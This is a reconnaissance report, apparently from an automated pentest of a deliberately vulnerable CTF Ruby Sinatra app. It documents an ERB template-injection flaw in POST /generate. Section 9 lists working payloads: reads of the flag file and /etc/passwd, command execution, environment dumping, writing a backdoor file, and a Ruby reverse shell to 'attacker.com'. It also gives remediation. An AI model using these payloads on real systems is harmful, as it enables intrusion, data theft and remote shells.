# Reconnaissance Deliverable

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface. Since this is a simple unauthenticated text generator application with no authorization controls, the focus is on the minimal attack surface and the critical Server-Side Template Injection (SSTI) vulnerability.

**Key Sections:**
- **Section 1 (Executive Summary):** Overview of the application purpose and critical vulnerability
- **Section 2 (Technology & Service Map):** Technology stack - Ruby/Sinatra with Puma web server
- **Section 3 (Authentication & Session Management):** None implemented - completely public access
- **Section 4 (API Endpoint Inventory):** Only 2 endpoints (GET / and POST /generate)
- **Section 5 (Potential Input Vectors):** 2 input vectors in POST /generate endpoint
- **Section 6 (Network & Interaction Map):** Single-service architecture with no external dependencies
- **Section 7 (Role & Privilege Architecture):** N/A - no roles or privileges exist
- **Section 8 (Authorization Vulnerability Candidates):** N/A - no authorization controls to test
- **Section 9 (Injection Sources):** 1 critical SSTI vulnerability leading to RCE

**Priority Order for Testing:** Focus immediately on Section 9's SSTI vulnerability in POST /generate - this is the primary and most critical attack vector.

## 1. Executive Summary

This is a **Ruby Sinatra text generation web application** running on port 4567, representing a deliberately vulnerable CTF-style target. The application consists of a single 157-line Ruby file serving two HTTP endpoints with no authentication, authorization, or session management.

**Core Functionality:** The application accepts user input (a sentence and repetition count) and generates repeated text output using ERB templating.

**Technology Stack:**
- **Backend:** Ruby 3.1.2 with Sinatra 3.2.0 web framework
- **Web Server:** Puma 6.4.2 (multi-threaded)
- **Template Engine:** ERB (Embedded Ruby) with full binding context
- **Deployment:** Docker containerized, binding to 0.0.0.0:4567

**Critical Security Finding:** The application contains a **Server-Side Template Injection (SSTI) vulnerability** at line 14 of app.rb where user-controlled input is directly interpolated into an ERB template and evaluated with full Ruby binding context. This vulnerability provides **remote code execution (RCE)** capabilities, allowing arbitrary file reads, system command execution, and complete server compromise.

**Attack Surface Summary:**
- 2 network-accessible HTTP endpoints (both public)
- No authentication or authorization controls
- Client-side validation only (easily bypassed)
- SSTI vulnerability leading to RCE
- CTF flag stored in plaintext at /app/flag.txt and ENV['FLAG']

**Exploitation Path:** Bypass trivial client-side JavaScript validation → Submit malicious ERB payload via POST /generate → Execute arbitrary Ruby code → Exfiltrate flag, read files, execute system commands.

## 2. Technology & Service Map

### Frontend
- **Framework:** None (server-rendered HTML via ERB templates)
- **CSS Framework:** Bootstrap 4.5.2 (CDN-hosted at maxcdn.bootstrapcdn.com)
- **JavaScript Library:** jQuery 3.5.1 (CDN-hosted)
- **Client-Side Validation:** Custom JavaScript regex validation (alphanumeric + spaces only)
- **Template Engine:** ERB (inline templates defined after `__END__` marker in app.rb)

### Backend
- **Language:** Ruby 3.1.2
- **Framework:** Sinatra 3.2.0 (minimalist DSL-based web framework)
- **Web Server:** Puma 6.4.2 (multi-threaded Ruby web server)
- **Template Engine:** ERB (Embedded Ruby) with dangerous `binding` parameter
- **Key Dependencies:**
  - `sinatra` 3.2.0 - Web framework
  - `puma` 6.4.2 - Application server
  - `rack` 2.2.9 - HTTP interface (OUTDATED - vulnerable to CVE-2024-26146 and CVE-2024-25126)
  - `rack-protection` 3.2.0 - Basic security middleware
  - `mustermann` 3.0.0 - Route pattern matching
  - `tilt` 2.3.0 - Template interface
  - `nio4r` 2.7.3 - Non-blocking I/O

### Infrastructure
- **Hosting:** Docker containerized application
- **Container Base:** ruby:3.1.2 official Docker image
- **Network Binding:** 0.0.0.0:4567 (all network interfaces)
- **Port Exposure:** 4567:4567 (host to container mapping)
- **Health Check:** curl -f http://localhost:4567 (every 30s)
- **TLS/SSL:** None (HTTP only - no HTTPS)
- **Reverse Proxy:** None detected
- **CDN:** None
- **Database:** None
- **Caching Layer:** None
- **Message Queue:** None

### Identified Subdomains
From nmap/subfinder scans (not directly related to target application on localhost:4567):
- mail03.regency.localhost
- tools.sonoma.edu.localhost
- exchvm.nwcnet.localhost
- mail.regency.localhost
- server02.counterintel.localhost
- sbs.allsaintsschool.localhost
- naeu2.naeuinc.localhost
- fndlync01.5ninesdata.localhost
- autodiscover.regency.localhost
- owa.regency.localhost
- server2.hunter.localhost
- www.localhost
- mail.localhost
- autodiscover.localhost
- mse-ca-mail.corp.mse.localhost
- mail02.regency.localhost

**Note:** These subdomains are likely unrelated test/example data from the scanning environment.

### Open Ports & Services
From nmap scan of localhost:
- **Port 80/tcp:** Caddy httpd (open, not directly related to target)
- **Port 443/tcp:** SSL/HTTPS (open, not directly related to target)
- **Port 631/tcp:** CUPS 2.3 IPP (open, printing service)
- **Port 4567/tcp:** **TARGET APPLICATION** - Puma web server serving Ruby Sinatra app
- **Port 7777/tcp:** Python SimpleHTTPServer 0.6 (directory listing)
- **Port 9999/tcp:** Python SimpleHTTPServer 0.6 (directory listing)
- **Port 49158/tcp:** Tailscale Golang net/http server (requires auth)

**Primary Target:** Port 4567 - Ruby Sinatra application

## 3. Authentication & Session Management Flow

### Finding: NO AUTHENTICATION OR SESSION MANAGEMENT IMPLEMENTED

**Entry Points:** NONE - The application has zero authentication entry points.

**Mechanism:** NOT APPLICABLE - The application implements no authentication mechanism of any kind.

**Code Pointers:** 
- **File:** /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb
- **Evidence:** No `before` filters, no login routes, no session configuration
- **Lines 1-3:** Only configuration present is `set :bind, '0.0.0.0'`
- **Lines 5-19:** Both routes (GET / and POST /generate) have zero authentication checks

**Comprehensive Analysis:**

**Authentication Endpoints:** NONE EXIST
- No /login endpoint
- No /logout endpoint
- No /register endpoint
- No /auth/* endpoints
- No OAuth/SSO callbacks
- No API authentication endpoints

**Session Configuration:** DISABLED
- Sessions not enabled (no `enable :sessions` directive)
- No session middleware configured
- No session cookies set
- No session storage (Redis, memcached, database)
- No session timeout logic
- No CSRF token handling

**Credential Handling:** NOT APPLICABLE
- No password hashing (no bcrypt, argon2 gems)
- No user database or storage
- No credential validation
- No password reset functionality

**Security Implications:** All endpoints are publicly accessible without any form of authentication. Any network-connected attacker can access all functionality including the critical SSTI vulnerability.

### 3.1 Role Assignment Process

**Finding:** NOT APPLICABLE - No roles exist in this application.

**Role Determination:** N/A
**Default Role:** N/A (no user concept)
**Role Upgrade Path:** N/A
**Code Implementation:** No role system implemented

### 3.2 Privilege Storage & Validation

**Finding:** NOT APPLICABLE - No privileges exist in this application.

**Storage Location:** N/A
**Validation Points:** N/A
**Cache/Session Persistence:** N/A (no sessions)
**Code Pointers:** No privilege validation code exists

### 3.3 Role Switching & Impersonation

**Finding:** NOT APPLICABLE - No role switching or impersonation features exist.

**Impersonation Features:** None
**Role Switching:** None
**Audit Trail:** None (no logging implemented)
**Code Implementation:** Not implemented

## 4. API Endpoint Inventory

**Network Surface Focus:** This inventory includes only network-accessible endpoints reachable through the deployed application on http://localhost:4567. No local-only utilities, development tools, or build scripts are included.

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|--------|---------------|---------------|----------------------|-------------------------|----------------------------|
| GET | / | anon (public) | None | None | Serves homepage with text generation form. Bootstrap 4.5.2 UI with jQuery validation. Returns HTML via ERB template `:index` (lines 23-100). **File:** app.rb:5-7 |
| POST | /generate | anon (public) | None | None | **CRITICAL VULNERABILITY:** Accepts `sentence` and `number` parameters, creates ERB template from user input with `ERB.new("#{sentence}")`, executes with `template.result(binding)` providing full Ruby context. Returns generated text via ERB template `:result` (lines 102-157). **SSTI/RCE vulnerability.** Client-side validation only (alphanumeric + spaces regex, max 200). **File:** app.rb:9-19 |

**Total Endpoints:** 2

**Endpoint Details:**

### Endpoint 1: GET /
- **Purpose:** Serve homepage with form
- **Authentication:** None
- **Parameters:** None
- **Response:** HTML (text/html;charset=utf-8)
- **Headers Set:** X-XSS-Protection: 1; mode=block, X-Content-Type-Options: nosniff, X-Frame-Options: SAMEORIGIN
- **Code Location:** app.rb lines 5-7

### Endpoint 2: POST /generate
- **Purpose:** Process text generation request
- **Authentication:** None
- **Parameters:** 
  - `sentence` (string) - User text to repeat, **VULNERABLE TO SSTI**
  - `number` (integer) - Repetition count, converted via .to_i
- **Response:** HTML (text/html;charset=utf-8)
- **Validation:** Client-side only, easily bypassed
- **Code Location:** app.rb lines 9-19
- **Critical Vulnerability:** Line 14 - `ERB.new("#{sentence}")`, Line 15 - `template.result(binding)`

**Security Headers (Default Sinatra/Rack):**
- X-XSS-Protection: 1; mode=block
- X-Content-Type-Options: nosniff
- X-Frame-Options: SAMEORIGIN

**Missing Security Controls:**
- Content-Security-Policy
- Strict-Transport-Security (no HTTPS)
- Server-side input validation
- Rate limiting
- Authentication on any endpoint

## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only input vectors accessible through the target web application's network interface are reported. No inputs from local-only scripts, build tools, or development utilities are included.

This section catalogs every network-accessible location where the application accepts user-controlled input, with exact file paths and line numbers for downstream vulnerability analysis.

### URL Parameters
- **None used** - The application uses POST body parameters only, no query string parameters

### POST Body Fields (Form Data)

**Endpoint:** POST /generate  
**Content-Type:** application/x-www-form-urlencoded

1. **Parameter:** `sentence`
   - **File:** /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb
   - **Line:** 10
   - **Code:** `sentence = params[:sentence]`
   - **Type:** String
   - **Validation:** Client-side only (JavaScript regex `/^[a-zA-Z0-9\s]+$/` at lines 88-92)
   - **Server-Side Validation:** **NONE**
   - **Data Flow:** params[:sentence] → sentence variable → ERB.new("#{sentence}") (line 14) → template.result(binding) (line 15) → @output array → HTML response
   - **Dangerous Sink:** ERB template with binding context - **CRITICAL SSTI/RCE**
   - **Exploitation:** Can inject ERB code like `<%= File.read('/app/flag.txt') %>` or `<%= system('whoami') %>`

2. **Parameter:** `number`
   - **File:** /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb
   - **Line:** 11
   - **Code:** `number = params[:number].to_i`
   - **Type:** Integer (converted from string)
   - **Validation:** Client-side only (JavaScript check `<= 200` at lines 83-86)
   - **Server-Side Validation:** **NONE** (no bounds checking)
   - **Data Flow:** params[:number] → .to_i conversion → loop range (1..number) → iteration count
   - **Risk:** Resource exhaustion/DoS if large value provided (bypassing client-side limit)
   - **Exploitation:** Can send `number=999999999` to cause excessive loop iterations

### HTTP Headers
**Finding:** The application does not read or process any HTTP headers in application logic.

**Evidence:**
- No `request.env` access
- No `request.headers` usage
- No X-Forwarded-For, User-Agent, Referer, or custom header processing
- Default Rack/Sinatra header handling only

**Potential Future Risk:** If headers like X-Forwarded-For were added to application logic (e.g., for logging), they could become injection vectors.

### Cookie Values
**Finding:** The application does not read or process any cookies.

**Evidence:**
- No `cookies` hash access
- No `response.set_cookie` calls
- No session cookies (sessions not enabled)
- No authentication cookies

**Note:** Sinatra's rack-protection middleware may set cookies, but application code does not access cookie values.

### File Uploads
**Finding:** No file upload functionality exists.

**Evidence:**
- No file input fields in forms
- No multipart/form-data handling
- No `params[:file]` or file processing code
- No Rack::Multipart configuration

### JSON/XML Request Bodies
**Finding:** No JSON or XML parsing in application code.

**Evidence:**
- No JSON.parse() calls
- No XML parsing libraries
- Only form-encoded POST data accepted
- No Content-Type: application/json handling

### Summary of Input Vectors

**Total Network-Accessible Input Vectors:** 2

| Vector | Location | Type | Validation | Risk Level | Dangerous Sink |
|--------|----------|------|------------|------------|----------------|
| params[:sentence] | app.rb:10 | String | Client-side only | **CRITICAL** | ERB template injection (line 14-15) |
| params[:number] | app.rb:11 | Integer | Client-side only | Medium | Loop count (DoS potential) |

**Bypass Techniques for Client-Side Validation:**
1. **Direct POST request:** `curl -X POST http://localhost:4567/generate -d "sentence=<%= payload %>&number=1"`
2. **Browser DevTools:** Disable JavaScript or modify validation function
3. **Proxy interception:** Burp Suite/OWASP ZAP to intercept and modify request
4. **Custom HTTP client:** Python requests, any HTTP library

## 6. Network & Interaction Map

**Network Surface Focus:** This map includes only components within the deployed, network-accessible infrastructure. Local development environments, build systems, and local-only tools are excluded.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|-------|------|------|------|------|-------|
| UserBrowser | ExternAsset | Internet | Browser | None | External users accessing the application |
| SinatraApp | Service | App | Ruby 3.1.2/Sinatra 3.2.0/Puma 6.4.2 | Public, CTF Flag | Main application server, binds to 0.0.0.0:4567, runs in Docker container |
| DockerContainer | Service | App | Docker | CTF Flag | Container runtime environment, stores flag at /app/flag.txt and ENV['FLAG'] |
| BootstrapCDN | ThirdParty | Internet | CDN | Public | maxcdn.bootstrapcdn.com - serves Bootstrap 4.5.2 CSS |

### 6.2 Entity Metadata

| Title | Metadata |
|-------|----------|
| SinatraApp | Hosts: `http://localhost:4567`; Endpoints: `/`, `/generate`; Auth: None; Dependencies: BootstrapCDN (CDN resources); Languages: Ruby 3.1.2; Frameworks: Sinatra 3.2.0, Puma 6.4.2; Vulnerabilities: SSTI/RCE in POST /generate; Flag Storage: /app/flag.txt, ENV['FLAG']; Network Binding: 0.0.0.0:4567 |
| DockerContainer | Runtime: Docker; Base Image: ruby:3.1.2; Exposed Ports: 4567; Volumes: None; User: root (principle of least privilege violated); Health Check: curl localhost:4567 every 30s; Flag Locations: /app/flag.txt (filesystem), ENV variable FLAG |
| BootstrapCDN | URL: https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css; Purpose: CSS framework; Security: External dependency, CDN integrity not verified (no SRI hashes) |

### 6.3 Flows (Connections)

| FROM → TO | Channel | Path/Port | Guards | Touches |
|-----------|---------|-----------|--------|---------|
| UserBrowser → SinatraApp | HTTP | :4567 / | None | Public |
| UserBrowser → SinatraApp | HTTP | :4567 /generate | None | Public |
| UserBrowser → BootstrapCDN | HTTPS | :443 *.bootstrapcdn.com | None | Public |
| SinatraApp → DockerContainer | Local | Filesystem /app/flag.txt | None | CTF Flag |
| SinatraApp → DockerContainer | Local | ENV variable access | None | CTF Flag |

### 6.4 Guards Directory

| Guard Name | Category | Statement |
|------------|----------|-----------|
| None | N/A | This application has no guards - all endpoints are publicly accessible without authentication, authorization, or access control |

**Note:** The application implements zero security guards. There is no authentication layer, no authorization checks, no network restrictions, no rate limiting, and no access control of any kind. All endpoints are completely open to the public internet.

## 7. Role & Privilege Architecture

**Finding:** NOT APPLICABLE - This application has no role or privilege architecture.

### 7.1 Discovered Roles

**No roles exist in this application.**

**Evidence:**
- No user management system
- No authentication mechanism
- No role definitions in code
- No database to store roles
- All endpoints are public

### 7.2 Privilege Lattice

**No privilege hierarchy exists.**

```
All users = anonymous (no authentication)
All users have equal access (no authorization)
All endpoints are public (no access control)
```

### 7.3 Role Entry Points

**All users access the same entry points regardless of identity (since there is no identity concept):**

| Role | Default Landing Page | Accessible Route Patterns | Authentication Method |
|------|---------------------|---------------------------|----------------------|
| anon (everyone) | / | /, /generate | None |

### 7.4 Role-to-Code Mapping

**No role implementation exists.**

**Evidence:** No authentication middleware, no session management, no role checks, no permission validation.

## 8. Authorization Vulnerability Candidates

**Finding:** NOT APPLICABLE - No authorization controls exist to test for vulnerabilities.

Since the application has zero authentication and authorization mechanisms, traditional authorization vulnerabilities (horizontal/vertical privilege escalation, IDOR, etc.) are not applicable. The entire application is already fully accessible to all users without any restrictions.

### 8.1 Horizontal Privilege Escalation Candidates

**None** - No user context, no object ownership, no ID-based routes.

### 8.2 Vertical Privilege Escalation Candidates

**None** - No role hierarchy, no privileged functionality, no admin endpoints.

### 8.3 Context-Based Authorization Candidates

**None** - No multi-step workflows, no state-dependent operations.

**Note:** The primary security vulnerability is the SSTI/RCE in POST /generate (detailed in Section 9), not authorization flaws.

## 9. Injection Sources (Command Injection and SQL Injection)

**Network Surface Focus:** Only injection sources reachable through the target web application's network interface are reported. Local-only scripts, build tools, CLI applications, and development utilities are excluded.

### SQL Injection Sources

**Finding: NONE**

**Evidence:**
- No database connection in application
- No SQL queries in code
- No database gems in Gemfile (no pg, mysql2, sqlite3, activerecord, sequel)
- Application is completely stateless with no data persistence

### Command Injection Sources

**Finding: NONE (Direct Command Execution)**

**Evidence:**
- No `system()` calls
- No `exec()` calls  
- No `spawn()` calls
- No backtick (`) command execution
- No `%x{}` syntax
- No `IO.popen()` calls
- No `Kernel.system` or similar methods

**Note:** While there are no direct command injection sources, the SSTI vulnerability (below) can be exploited to achieve command execution through Ruby's system methods.

### Server-Side Template Injection (SSTI) Sources

**Finding: 1 CRITICAL VULNERABILITY**

#### SSTI Source #1: ERB Template Injection in POST /generate

**Vulnerability Classification:** Server-Side Template Injection (SSTI) leading to Remote Code Execution (RCE)

**Severity:** CRITICAL  
**CVSS 3.1 Score:** 10.0 (Critical)  
**Vector:** CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:H/A:H

**File:** /Users/arjunmalleswaran/Code/pentest-workspaces/XBEN-086-24/app/app.rb  
**Vulnerable Lines:** 10, 14-15

**Complete Data Flow Path:**

```
HTTP POST /generate
  ↓
params[:sentence] (line 10) ← USER CONTROLLED INPUT (no validation)
  ↓
sentence = params[:sentence] (line 10)
  ↓
String interpolation: "#{sentence}" (line 14)
  ↓
ERB.new("#{sentence}") (line 14) ← DANGEROUS: Creates ERB template from user input
  ↓
template.result(binding) (line 15) ← CRITICAL: Executes with full Ruby binding context
  ↓
@output array (line 13-16)
  ↓
Rendered in HTML response via erb :result (line 18)
```

**Vulnerable Code Snippet:**

```ruby
# Lines 9-19 in app.rb
post '/generate' do 
  sentence = params[:sentence]          # Line 10: No validation, direct assignment
  number = params[:number].to_i         # Line 11: Number of iterations

  @output = (1..number).map do
    template = ERB.new("#{sentence}")   # Line 14: VULNERABLE - User input in template
    template.result(binding)             # Line 15: CRITICAL - Full binding context
  end
  @number = number
  erb :result                            # Line 18: Render results
end
```

**Vulnerability Explanation:**

The application takes user-supplied input from `params[:sentence]` and directly interpolates it into an ERB template constructor using string interpolation: `ERB.new("#{sentence}")`. This template is then evaluated with `template.result(binding)`, which provides the template with **complete access to the Ruby execution environment**, including:

- All local variables in scope
- All instance variables (@output, @number)
- All environment variables (ENV hash containing FLAG)
- File system operations (File.read, File.write, Dir.entries)
- System command execution (system, exec, backticks, %x{})
- Network operations (Net::HTTP, TCPSocket)
- Ruby introspection (ObjectSpace, eval)
- Process control (fork, exit, abort)

**Input Validation Status:**

**Client-Side Validation (Lines 88-92):** JavaScript regex `/^[a-zA-Z0-9\s]+$/` (alphanumeric and spaces only)

```javascript
var regex = /^[a-zA-Z0-9\s]+$/;
if(!regex.test($("#sentence").val())) {
  alert("Invalid input format");
  return false;
}
```

**Server-Side Validation:** **NONE** - Completely absent, easily bypassed

**Bypass Methods:**
1. Direct POST request: `curl -X POST http://localhost:4567/generate -d "sentence=<payload>"`
2. Disable JavaScript in browser
3. Intercept request with Burp Suite/OWASP ZAP
4. Any HTTP client library (Python requests, etc.)

**Exploitation Examples:**

**1. Flag Exfiltration (File Read):**
```
POST /generate
sentence=<%= File.read('/app/flag.txt') %>&number=1
```

**2. Flag Exfiltration (Environment Variable):**
```
POST /generate
sentence=<%= ENV['FLAG'] %>&number=1
```

**3. System Command Execution:**
```
POST /generate
sentence=<%= `whoami` %>&number=1

POST /generate  
sentence=<%= system('cat /etc/passwd') %>&number=1
```

**4. Directory Listing:**
```
POST /generate
sentence=<%= Dir.entries('/app').join(', ') %>&number=1
```

**5. Environment Enumeration:**
```
POST /generate
sentence=<%= ENV.to_h.inspect %>&number=1
```

**6. Reverse Shell (Ruby):**
```
POST /generate
sentence=<%= require 'socket'; s=TCPSocket.new('attacker.com',4444); exec('/bin/bash -i <&3 >&3 2>&3') %>&number=1
```

**7. File Write (if writable location exists):**
```
POST /generate
sentence=<%= File.write('/tmp/backdoor.rb', 'malicious code') %>&number=1
```

**Impact Assessment:**

- **Confidentiality:** CRITICAL - Full file system read access, environment variable access, flag exfiltration
- **Integrity:** CRITICAL - File system write access (if permissions allow), code modification, data tampering
- **Availability:** CRITICAL - Process termination, resource exhaustion, container crash, denial of service

**Additional Context:**

- **Line 11:** The `number` parameter is converted to integer via `.to_i`, which is type-safe and not directly exploitable for injection, but could cause resource exhaustion/DoS with large values
- **Line 13:** The loop iterates `number` times, executing the SSTI payload on each iteration
- **Line 18:** Results are rendered in HTML, creating potential XSS if SSTI payload generates HTML/JavaScript

**Remediation Recommendations:**

1. **NEVER** use `ERB.new()` with user-controlled input
2. **NEVER** use `binding` parameter in template evaluation
3. Use predefined templates with variable substitution instead
4. Implement strict server-side input validation
5. Use safe rendering methods: `erb :template_name` with instance variables
6. Apply principle of least privilege (don't run container as root)
7. Implement Content-Security-Policy headers
8. Add rate limiting and request monitoring

**Safe Alternative Implementation:**

```ruby
post '/generate' do 
  sentence = params[:sentence].to_s
  number = params[:number].to_i
  
  # Server-side validation
  halt 400, "Invalid characters" unless sentence.match?(/\A[a-zA-Z0-9\s]+\z/)
  halt 400, "Sentence too long" if sentence.length > 200
  halt 400, "Number out of range" unless (1..200).include?(number)
  
  # Safe processing - no template injection
  @output = [sentence] * number
  @number = number
  erb :result
end
```

**References:**
- OWASP SSTI: https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/07-Input_Validation_Testing/18-Testing_for_Server-side_Template_Injection
- ERB Security: https://ruby-doc.org/stdlib-3.1.2/libdoc/erb/rdoc/ERB.html

---

### Summary of Injection Sources

| Category | Count | Severity | Locations |
|----------|-------|----------|-----------|
| SQL Injection | 0 | N/A | None found |
| Command Injection | 0 | N/A | None found (but achievable via SSTI) |
| Template Injection (SSTI) | 1 | **CRITICAL** | app.rb:14-15 (POST /generate endpoint) |

**Total Network-Accessible Injection Sources:** 1 (SSTI/RCE)

**Primary Attack Vector:** Server-Side Template Injection in POST /generate leading to complete remote code execution, flag exfiltration, and full system compromise.